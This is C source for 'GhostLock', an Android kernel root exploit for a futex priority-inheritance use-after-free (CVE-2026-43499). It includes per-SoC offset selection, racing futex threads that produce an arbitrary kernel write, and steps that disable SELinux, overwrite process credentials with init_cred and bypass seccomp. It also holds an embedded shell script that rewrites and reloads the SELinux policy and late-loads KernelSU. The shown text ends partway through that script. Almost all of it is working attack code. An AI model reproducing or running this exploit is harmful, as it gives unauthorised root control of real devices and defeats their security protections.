/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 */

#include "common.h"
#include "glk_session.h"
#include "glk43499_api.h"
#include "offsets.h"
#include <ctype.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/system_properties.h>
#include <sys/utsname.h>
#include <strings.h>



#if defined(GLK_ENABLE_NATIVE_PROFILES)
/* MTK and XRing use different physical mappings from the Qualcomm default.
 * W1 has no root and /proc is SELinux-blocked: read SoC properties from the
 * shared property area instead. */
enum soc_family {
  SOC_QCOM = 0,
  SOC_MTK,
  SOC_XRING,
};

static enum soc_family detect_soc(void) {
  char buf[256];
  const char *keys[] = {"ro.soc.manufacturer", "ro.soc.model",
                        "ro.board.platform", NULL};
  for (int i = 0; keys[i]; i++) {
    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
      continue;
    }
    if (strncasecmp(buf, "mediatek", 8) == 0 ||
        strncasecmp(buf, "mtk", 3) == 0 ||
        (i > 0 && strncasecmp(buf, "mt", 2) == 0)) {
      return SOC_MTK;
    }
  }
  for (int i = 0; keys[i]; i++) {
    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
      continue;
    }
    if (strncasecmp(buf, "xring", 5) == 0 ||
        (i > 0 && strncasecmp(buf, "o1", 2) == 0)) {
      return SOC_XRING;
    }
  }
  return SOC_QCOM;
}
#endif

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         t->off_selinux_enforcing
#define INIT_CRED_OFF                 t->off_init_cred
#define INIT_TASK_OFF                 t->off_init_task
#define ROOT_TASK_GROUP_OFF           t->off_root_task_group
#define SELINUX_BLOB_SIZES_OFF        t->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       t->off_security_hook_heads
#define SLIDE_NFULNL_LOGGER_OFF       t->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         t->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF t->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       t->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "../runtime_struct_offsets.h"
/* VR.ko anti-root fallback defines */
#ifndef VR_TAG_A_OFF
#define VR_TAG_A_OFF           0x06
#endif
#ifndef VR_TAG_B_OFF
#define VR_TAG_B_OFF           0x2c
#endif
#ifndef VR_SYSCALL_TP_FLAG
#define VR_SYSCALL_TP_FLAG     0x400ULL
#endif
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#endif
#if defined(GLK_ENABLE_NATIVE_PROFILES)
static int validate_offsets_profile(const struct kernel_offsets *entry) {
  if (!entry || !entry->uname_r || !entry->off_init_task ||
      !entry->off_init_cred || !entry->off_root_task_group ||
      !entry->off_selinux_enforcing || !entry->task_prio ||
      !entry->task_pi_lock || !entry->task_pi_waiters ||
      !entry->task_pi_blocked_on || !entry->task_cred ||
      !entry->task_seccomp) {
    pr_error("offset profile is incomplete\n");
    return -1;
  }
  if ((entry->kernel_major != 5 && entry->kernel_major != 6) ||
      !entry->cred_copy_size ||
      entry->cred_usage_offset + sizeof(uint32_t) > entry->cred_copy_size ||
      !entry->cred_caps_count ||
      entry->cred_caps_offset + entry->cred_caps_count * sizeof(uint64_t) >
          entry->cred_copy_size || entry->cred_ref_count > 4) {
    pr_error("offset profile has no valid kernel family or credential template\n");
    return -1;
  }
  const uint32_t cred_ref_offsets[] = {
      entry->cred_ref0_offset, entry->cred_ref1_offset,
      entry->cred_ref2_offset, entry->cred_ref3_offset,
  };
  const uint64_t cred_ref_images[] = {
      entry->cred_ref0_image, entry->cred_ref1_image,
      entry->cred_ref2_image, entry->cred_ref3_image,
  };
  for (uint32_t i = 0; i < entry->cred_ref_count; i++) {
    if (!cred_ref_images[i] ||
        cred_ref_offsets[i] + sizeof(uint64_t) > entry->cred_copy_size) {
      pr_error("offset profile credential reference %u is invalid\n", i);
      return -1;
    }
  }
  if (entry->kernel_major == 5) {
    if (!entry->off_empty_zero_page || !entry->off_mcast_fake_bss ||
        !entry->compact_waiter ||
        !entry->mm_struct_sz ||
        entry->mcast_waiter_off <= 0 ||
        !entry->mcast_buffer_size ||
        entry->mcast_waiter_off + entry->mcast_lock_offset + sizeof(uint64_t) >
            entry->mcast_buffer_size ||
        !entry->mcast_task_offset || !entry->mcast_lock_offset ||
        !entry->mcast_fake_lock_offset || !entry->mcast_fake_task_offset ||
        !entry->mcast_lock_slots_offset ||
        !entry->mcast_lock_slot_count || !entry->mcast_lock_slot_stride ||
        entry->cred_copy_size < 0xa0 || !entry->cred_ref_count) {
      pr_error("5.x profile requires empty_zero_page, compact waiter, "
               "credential references, an mm_struct stride, and complete "
               "multicast geometry\n");
      return -1;
    }
  }
  return 0;
}

/* Entries carry a phys load address only when measured; otherwise MTK uses
 * the DRAM base, xring its constant, qcom its GKI version. */
static void publish_active_offsets(Glk43499Target *target) {
  const struct kernel_offsets *t = &target->offsets;
  if (t->off_init_cred) {
    target->layout.init_cred_image =
        target->layout.kimage_text_base + t->off_init_cred;
  }
  enum soc_family soc = detect_soc();
  const char *soc_name =
      soc == SOC_MTK ? "mtk" : soc == SOC_XRING ? "xring" : "qcom/other";
  if (t->kernel_phys_load) {
    target->layout.p0_kernel_phys_load = t->kernel_phys_load;
  } else if (soc == SOC_MTK) {
    target->layout.p0_kernel_phys_load =
        target->layout.kimage_text_base - target->layout.mtk_vaddr_base;
    soc_name = "mtk";
  } else if (soc == SOC_XRING) {
    target->layout.p0_kernel_phys_load = target->layout.xring_kernel_phys_load;
    soc_name = "xring";
  } else if (strncmp(t->uname_r, "6.12.", 5) == 0) {
    target->layout.p0_kernel_phys_load = target->layout.qc_gki_6_12_phys_load;
    soc_name = "qcom/6.12";
  }
  pr_info("soc: %s; kernel_phys_load=0x%zx\n",
          soc_name, target->layout.p0_kernel_phys_load);
  pr_info("init_cred image=%016zx alias=%016zx\n",
          target->layout.init_cred_image,
          data_addr(target, target->layout.init_cred_image));
}

/* Import a matching entry from <home>/offsets.json; returns 0 and activates
 * the external table on success.  When the release is also registered in the
 * built-in table, the entry starts from the built-in values so fields the
 * JSON leaves empty keep the built-in ones instead of falling back to
 * target.h defaults. */
static void target_store_offsets(Glk43499Target *target,
                                const struct kernel_offsets *src,
                                const char *release) {
  target->offsets = *src;
  snprintf(target->release, sizeof(target->release), "%s", release);
  target->offsets.uname_r = target->release;
  target->self = (uintptr_t)target;
}

static int try_external_offsets(const char *release, const char *home,
                                struct kernel_offsets *out,
                                char *release_buf, size_t release_cap) {
  char path[320];
  snprintf(path, sizeof(path), "%s/offsets.json", home);
  const struct kernel_offsets *builtin = NULL;
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(release, known_offsets[i].uname_r) == 0) {
      builtin = &known_offsets[i];
      break;
    }
  }
  if (builtin) {
    *out = *builtin;
  } else {
    memset(out, 0, sizeof(*out));
  }
  char *file_buf = malloc(1 << 20);
  if (!file_buf) return -1;
  int rc = load_offsets_json(path, release, out, release_buf, release_cap,
                             file_buf, 1 << 20);
  free(file_buf);
  if (rc == 0) {
    if (validate_offsets_profile(out) != 0) return -1;
    pr_success("offsets imported from offsets.json: %s\n", out->uname_r);
  } else {
    pr_info("no external offsets match at %s\n", path);
  }
  return rc;
}

static int select_offsets(Glk43499Target *target, const char *home) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
  if (strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0) {
    pr_error("build requires kernel %s, got %s\n",
             TARGET_KERNEL_RELEASE, uts.release);
    return -1;
  }
#endif
  struct kernel_offsets imported;
  char imported_release[192] = {0};
  if (try_external_offsets(uts.release, home, &imported,
                           imported_release, sizeof(imported_release)) == 0) {
    target_store_offsets(target, &imported, imported_release);
    publish_active_offsets(target);
    return 0;
  }
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      target_store_offsets(target, &known_offsets[i], uts.release);
      if (validate_offsets_profile(&target->offsets) != 0) return -1;
      pr_success("offsets matched: %s\n", target->offsets.uname_r);
      publish_active_offsets(target);
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild, or import a matching "
           "offsets.json entry into %s\n",
           home);
  return -1;
}
#endif

static void timer_reset(Glk43499Session *s) {
  clock_gettime(CLOCK_MONOTONIC, &s->rt.t0);
}

static double timer_ms(Glk43499Session *s) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - s->rt.t0.tv_sec) * 1000.0 +
         (now.tv_nsec - s->rt.t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(s), label)

/** @brief Take the waiter chain lock and wait for the owner to start. */
static inline __attribute__((always_inline)) void
waiter_enter_chain(Glk43499Session *s, Glk43499Runtime *rt) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&rt->waiter_tid, tid);
  if (futex_op(&rt->f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&rt->waiter_ready, 1);
  while (!atomic_load(&rt->owner_started)) usleep(s->config.race_poll_us);
}

/** @brief Arm the pi-chain wait with the route-selected timeout. */
static inline __attribute__((always_inline)) void
waiter_wait_chain(Glk43499Session *s, Glk43499Runtime *rt) {
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  if (atomic_load(&rt->fast_repair_route)) {
    timeout.tv_nsec += (long)s->config.route_fast_wait_us * 1000L;
    if (timeout.tv_nsec >= 1000000000L) {
      timeout.tv_sec++;
      timeout.tv_nsec -= 1000000000L;
    }
  } else {
    timeout.tv_sec += s->config.route_wait_seconds;
  }
  atomic_store(&rt->waiter_waiting, 1);
  futex_op(&rt->f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &rt->f_pi_target, 0);
}

/** @brief Run the selected PI route and its 5.x disarm step. */
static inline __attribute__((always_inline)) void
waiter_dispatch_route(Glk43499Session *s, Glk43499Runtime *rt,
                      const GlkWriteRequest *req) {
  if (kernel5_route_selected(&s->target.offsets)) {
    do_kernel5_fake_lock_route(s, req);
    /* remove_waiter() left this thread's pi_blocked_on pointing at the
     * reclaimed stack waiter. Force one final slow-path removal while the
     * stack frame is still alive, matching the 5.x multicast primitive's
     * disarm step. Without this, thread exit leaves a walkable dangling
     * ghost and the next mm_struct spray can panic the kernel. */
    uint32_t dummy_pi = 0x80000000U | (uint32_t)getpid();
    struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
    errno = 0;
    futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
  } else if (tcp_route_selected(&s->target.offsets, s->config.tcp_route)) {
    do_tcp_fake_lock_route(s, req);
  } else {
    do_pselect_fake_lock_route(s, req);
  }
}

/** @brief Publish route_done, release the chain, and wait for the owner. */
static inline __attribute__((always_inline)) void
waiter_finish_route(Glk43499Session *s, Glk43499Runtime *rt) {
  atomic_store(&rt->route_done, 1);
  futex_op(&rt->f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&rt->owner_chain_done)) usleep(s->config.race_poll_us);
}

void *waiter_thread(void *arg) {
  GlkRouteThreadArg *wa = arg;
  Glk43499Session *s = wa->s;
  Glk43499Runtime *rt = &s->rt;
  const GlkWriteRequest *req = wa->req;
  waiter_enter_chain(s, rt);
  waiter_wait_chain(s, rt);
  waiter_dispatch_route(s, rt, req);
  waiter_finish_route(s, rt);
  return NULL;
}

/** @brief Acquire the owner's target PI lock. */
static inline __attribute__((always_inline)) long
owner_lock_target(Glk43499Runtime *rt) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&rt->f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  return lock_target;
}

/** @brief Wait for the waiter, then take/release the chain coordination lock. */
static inline __attribute__((always_inline)) void
owner_wait_waiter(Glk43499Session *s, Glk43499Runtime *rt) {
  while (!atomic_load(&rt->waiter_ready)) usleep(s->config.race_poll_us);
  atomic_store(&rt->owner_started, 1);
  futex_op(&rt->f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&rt->owner_chain_done, 1);
}

/** @brief Park until stop, then release the target PI lock if held. */
static inline __attribute__((always_inline)) void
owner_finish(Glk43499Runtime *rt, long lock_target) {
  while (!atomic_load(&rt->owner_stop)) sleep(1);
  if (lock_target == 0)
    futex_op(&rt->f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
}

void *owner_thread(void *arg) {
  Glk43499Session *s = arg;
  Glk43499Runtime *rt = &s->rt;
  long lock_target = owner_lock_target(rt);
  owner_wait_waiter(s, rt);
  owner_finish(rt, lock_target);
  return NULL;
}

/** @brief Rotate the consumer nice and recover with a timed PI lock on failure. */
static long consumer_apply_nice(Glk43499Session *s, Glk43499Runtime *rt,
                               int tid, int calls_this_seq) {
  errno = 0;
  int consumer_nice = (s->target.offsets.compact_waiter)
                          ? (calls_this_seq % 19) + 1
                          : s->config.select_consumer_nice;
  long sched_ret = sched_setattr_tid(tid, consumer_nice);
  if (sched_ret != 0) {
    struct timespec ft = {.tv_sec = 0,
                                   .tv_nsec = (long)s->config.consumer_retry_wait_us * 1000L};
    long fret = futex_op(&rt->f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
    if (fret == 0) {
      futex_op(&rt->f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
      sched_ret = 0;
    }
  }
  return sched_ret;
}

void *consumer_thread(void *arg) {
  Glk43499Session *s = arg;
  Glk43499Runtime *rt = &s->rt;
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE(s));
  int seen = 0;
  while (!atomic_load(&rt->punch_consume_stop)) {
    int seq = atomic_load(&rt->punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&rt->waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&rt->punch_consume_stop) &&
           atomic_load(&rt->punch_consume_go) == seq) {
      int delay_usec = atomic_load(&rt->main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (uint32_t burst = 0; burst < s->config.select_consumer_burst_calls; burst++) {
        if (atomic_load(&rt->punch_consume_stop) ||
            atomic_load(&rt->punch_consume_go) != seq) break;
        atomic_fetch_add(&rt->consumer_calls, 1);
        atomic_store(&rt->consumer_inflight, 1);
        long sched_ret = consumer_apply_nice(s, rt, tid, calls_this_seq);
        if (sched_ret == 0) atomic_fetch_add(&rt->consumer_success, 1);
        atomic_store(&rt->consumer_inflight, 0);
        calls_this_seq++;
        if ((uint32_t)calls_this_seq >= s->config.select_consumer_max_calls) {
          atomic_store(&rt->punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  rt->f_wait = 0; rt->f_pi_target = 0; rt->f_pi_chain = 0;
  atomic_store(&rt->waiter_ready, 0); atomic_store(&rt->waiter_waiting, 0);
  atomic_store(&rt->owner_started, 0); atomic_store(&rt->owner_chain_done, 0);
  atomic_store(&rt->owner_stop, 0);
  atomic_store(&rt->route_done, 0); atomic_store(&rt->waiter_tid, 0);
  atomic_store(&rt->punch_consume_go, 0); atomic_store(&rt->punch_consume_stop, 0);
  atomic_store(&rt->consumer_calls, 0); atomic_store(&rt->consumer_success, 0);
  atomic_store(&rt->consumer_inflight, 0);
  atomic_store(&rt->main_route_delay_usec,
               atomic_load(&rt->fast_repair_route)
                   ? s->config.select_fast_repair_us
                   : s->config.select_enter_delay_us);
  rt->route_last_step = 0; rt->route_last_errno = 0;
}

/** @brief Thread handles owned by one run_main_route_threads call. */
struct route_threads {
  pthread_t waiter, owner, consumer;
  GlkRouteThreadArg waiter_arg;
};

/** @brief Start the three route threads after resetting the route state. */
static inline __attribute__((always_inline)) void
route_start_threads(Glk43499Session *s, const GlkWriteRequest *req,
                    struct route_threads *th) {
  th->waiter_arg = (GlkRouteThreadArg){ .s = s, .req = req };
  pr_debug("[route] creating waiter/owner/consumer\n");
  SYSCHK(pthread_create(&th->waiter, NULL, waiter_thread, &th->waiter_arg));
  SYSCHK(pthread_create(&th->owner, NULL, owner_thread, s));
  SYSCHK(pthread_create(&th->consumer, NULL, consumer_thread, s));
}

/** @brief Stop the consumer/owner and join all three route threads. */
static inline __attribute__((always_inline)) void
route_stop_threads(Glk43499Session *s, struct route_threads *th) {
  Glk43499Runtime *rt = &s->rt;
  atomic_store(&rt->punch_consume_go, 0);
  atomic_store(&rt->punch_consume_stop, 1);
  atomic_store(&rt->owner_stop, 1);
  pthread_join(th->waiter, NULL);
  pthread_join(th->owner, NULL);
  pthread_join(th->consumer, NULL);
  pr_debug("[route] threads joined\n");
}

int run_main_route_threads(Glk43499Session *s, const GlkWriteRequest *req) {
  Glk43499Runtime *rt = &s->rt;
  reset_main_route_state(s);
  struct route_threads th;
  route_start_threads(s, req, &th);
  while (!atomic_load(&rt->waiter_waiting) || !atomic_load(&rt->owner_started))
    usleep(s->config.race_poll_us);
  pr_debug("[route] waiter parked; owner started\n");
  usleep(atomic_load(&rt->fast_repair_route)
             ? s->config.select_fast_repair_us
             : s->config.select_enter_delay_us);
  errno = 0;
  long rq = futex_op(&rt->f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                     &rt->f_pi_target, 0);
  pr_debug("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
          rq, errno);
  while (!atomic_load(&rt->route_done)) usleep(s->config.select_route_poll_us);
  pr_debug("[route] route_done step=%d errno=%d calls=%d success=%d\n",
          rt->route_last_step, rt->route_last_errno, atomic_load(&rt->consumer_calls),
          atomic_load(&rt->consumer_success));

  route_stop_threads(s, &th);

  return atomic_load(&rt->consumer_calls) > 0 &&
         atomic_load(&rt->consumer_success) > 0 && rt->route_last_step == 0;
}

/**
 * @brief Build one synchronous write request.
 * @param target Kernel address to write.
 * @param label Borrowed log label.
 * @param mode 1 = zero, 2 = credential.
 * @param leaf 1 = value 0 / leaf layout, 0 = preserve child.
 * @return Request value; label lifetime is the call only.
 */
static GlkWriteRequest make_write_request(uintptr_t target,
                                          const char *label,
                                          int mode, int leaf) {
  GlkWriteRequest req = {
      .target = target,
      .value = 0,
      .mode = (uint32_t)mode,
      .preserve_child = leaf ? 0u : 1u,
      .label = label,
  };
  return req;
}

/** @brief Execute the resident 5.x multicast write path. */
static inline __attribute__((always_inline)) int
do_one_write_resident(Glk43499Session *s, uintptr_t target, int mode, int leaf) {
  const Glk43499Layout *L = &s->target.layout;
  const struct kernel_offsets *t = &s->target.offsets;
  if (!kernel5_resident_start(s)) {
    pr_warning("5.x resident multicast setup failed\n");
    return 0;
  }
  uintptr_t value = leaf ? 0 : (mode == 2
      ? data_addr(&s->target, L->init_cred_image)
      : data_addr(&s->target, EMPTY_ZERO_PAGE));
  return kernel5_resident_write(s, target, value);
}

/** @brief Prepare the fake page and execute one PI route. */
static inline __attribute__((always_inline)) int
do_one_write_route(Glk43499Session *s, const GlkWriteRequest *req) {
  Glk43499Runtime *rt = &s->rt;
  TIMER("  heap spray start");
  rt->page_base = prepare_good_kernel_page(s, req);
  if (!rt->page_base) { pr_warning("  heap spray failed\n"); return 0; }
  TIMER("  heap spray done");
  int routed = run_main_route_threads(s, req);
  TIMER("  PI route done");
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int do_one_write(Glk43499Session *s, uintptr_t target,
                        const char *desc, int mode, int leaf) {
  GlkWriteRequest req = make_write_request(target, desc, mode, leaf);
  pr_debug("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
  /* Both transports write *(target) := value through the erase left-only
   * relink: waiter words are {pc = value, right = 0, left = target} and
   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
  if (kernel5_route_selected(&s->target.offsets) && s->config.resident_5x) {
    return do_one_write_resident(s, target, mode, leaf);
  }
  return do_one_write_route(s, &req);
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status) return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

static void slab_drain(uint32_t drain_us) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0) drain[n++] = pid;
      else break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(drain_us);
  }
}

void glk43499_write_root_script(const Glk43499Config *cfg) {
  char script[8192];
  int sfd = open(cfg->root_script, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_warning("open root script failed path=%s errno=%d\n",
               cfg->root_script, errno);
    return;
  }

  int n = snprintf(
      script, sizeof(script),
      "#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
      "KSUD=\"$HOME_DIR/ksud\"\n"
      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
      "if [ \"$(id -u)\" -ne 0 ]; then\n"
      "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
      "  exit 1\n"
       "fi\n"
       "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
       "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
       "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
       "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
       "fi\n"
      "KVER=$(uname -r | cut -d. -f1-2)\n"
      "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
      "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
      "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "KMI=\"${AVER}-${KVER}\"\n"
      "# safe mode: disable all modules before exec ksud\n"
      "if [ \"$GHOSTLOCK_DISABLE_MODULES\" = \"1\" ]; then\n"
      "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
      "  n=0\n"
      "  for m in /data/adb/modules/*/; do\n"
      "    [ -d \"$m\" ] || continue\n"
      "    if touch \"${m}disable\" 2>/dev/null; then\n"
      "      n=$((n+1))\n"
      "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
      "    fi\n"
      "  done\n"
      "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
      "fi\n"
      "# step 1: restore policy\n"
      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
      "  exit 1\n"
      "}\n"
      "trap 'rm -f \"$POLICY\"' EXIT\n"
      "prepare_policy() {\n"
      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
      "  case \"$HEADER\" in\n"
      /* Mechanical: \x3f keeps the same 16 '?' bytes without a trigraph warning. */
      "    8cff7cf9080000005345204c696e7578\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f) ;;\n"
      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
      "  esac\n"
      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
      "  [ -n \"$CONFIG\" ] || return 1\n"
      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
      "}\n"
      "FIXUP_RC=1\n"
      "for i in $(seq 1 10); do\n"
      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
      "    sleep 2\n"
      "    continue\n"
      "  fi\n"
      "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
      "  LPID=$!\n"
      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
      "  SPID=$!\n"
      "  wait $LPID 2>/dev/null\n"
      "  FIXUP_RC=$?\n"
      "  kill $SPID 2>/dev/null\n"
      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
      "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
      "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
      "      break\n"
      "    fi\n"
      "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
      "    FIXUP_RC=1\n"
      "  fi\n"
      "  sleep 2\n"
      "done\n"
      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  KSU_ALREADY=1\n"
      "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
      "else\n"
      "  KSU_ALREADY=0\n"
      "  if [ ! -x \"$KSUD\" ]; then\n"
      "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
      "    exit 1\n"
      "  fi\n"
      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
